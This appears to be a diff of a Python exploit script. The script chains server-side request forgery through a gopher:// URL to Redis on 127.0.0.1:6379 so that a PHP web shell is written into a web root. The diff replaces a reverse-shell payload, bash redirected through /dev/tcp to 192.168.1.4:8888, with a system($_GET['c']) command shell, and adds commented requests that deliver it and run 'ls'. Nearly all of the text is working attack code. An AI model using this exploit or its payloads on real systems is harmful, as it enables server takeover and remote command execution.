@@ -2,7 +2,7 @@ import urllib.parse
 import requests
 
 
-php_payload = """<?php exec("bash -c 'bash -i >& /dev/tcp/192.168.1.4/8888 2>&1'"); ?>"""
+php_payload = """<?php system($_GET['c']); ?>"""
 
 web_root_location = "/www"
 payload = """*1\r
@@ -45,6 +45,9 @@ save\r
 finalpayload = urllib.parse.quote("gopher://127.0.0.1:6379/_" + payload, safe='').replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
 
 
-print(requests.post('http://localhost:5000/index.php', data={'url':finalpayload}).text)
+print(finalpayload)
+
+# print(requests.post('http://localhost/index.php', data={'url':finalpayload}).text)
 
 
+# print(requests.get('http://localhost/shell.php?c=ls').text)
